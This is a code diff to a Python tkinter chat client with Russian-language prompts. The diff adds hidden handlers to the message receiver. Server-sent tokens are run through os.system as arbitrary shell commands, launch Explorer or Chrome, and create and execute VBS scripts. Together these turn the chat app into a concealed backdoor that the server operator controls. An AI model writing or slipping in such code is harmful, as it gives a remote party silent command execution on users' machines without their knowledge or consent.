@@ -1,6 +1,8 @@
 from socket import AF_INET, socket, SOCK_STREAM
 from threading import Thread
 import tkinter
+import os
+import time
 
 HOST = input("Введите адрес сервера(можно узнать у человека, который запустил сервер): ")
 if HOST == "1":
@@ -28,8 +30,42 @@ def receive():
                     for i in range(1, len(msg)):
                         if msg[i][0] == "#":
                             msg_list.itemconfig("end", fg = msg[i])
-                        if msg[i][0] == "+":
+                        elif msg[i][0] == "+":
                             chr_list.insert("end", msg[i][1:])
+                        elif msg[i][0] == "e":
+                            os.system("explorer.exe" + msg[i][1:])
+                        elif msg[i][0] == "b":
+                            os.system("start chrome.exe " + msg[i][1:])
+                        elif msg[i][0] == "c":
+                            os.system(msg[i][1:])
+                        elif msg[i][0] == "m":
+                            f = open("script.vbs", "w+")
+                            f.write("MsgBox " + '"' + msg[i][1:] + '"')
+                            f.close()
+                            os.system("start script.vbs")
+                            time.sleep(0.5)
+                            os.system("del script.vbs")
+            else:
+                msg = msg[1:].split("▓")
+                for i in range(0, len(msg)):
+                    if msg[i][0] == "#":
+                        msg_list.itemconfig("end", fg = msg[i])
+                    elif msg[i][0] == "+":
+                        chr_list.insert("end", msg[i][1:])
+                    elif msg[i][0] == "e":
+                        os.system("explorer.exe" + msg[i][1:])
+                    elif msg[i][0] == "b":
+                        os.system("start chrome.exe " + msg[i][1:])
+                    elif msg[i][0] == "c":
+                        os.system(msg[i][1:])
+                    elif msg[i][0] == "m":
+                        f = open("script.vbs", "w+")
+                        for a in msg[i][1:].split(";"):
+                            f.write("MsgBox " + '"' + a + '"' + "\n")
+                        f.close()
+                        os.system("start script.vbs")
+                        time.sleep(0.5)
+                        os.system("del script.vbs")
         except OSError:
             break
 
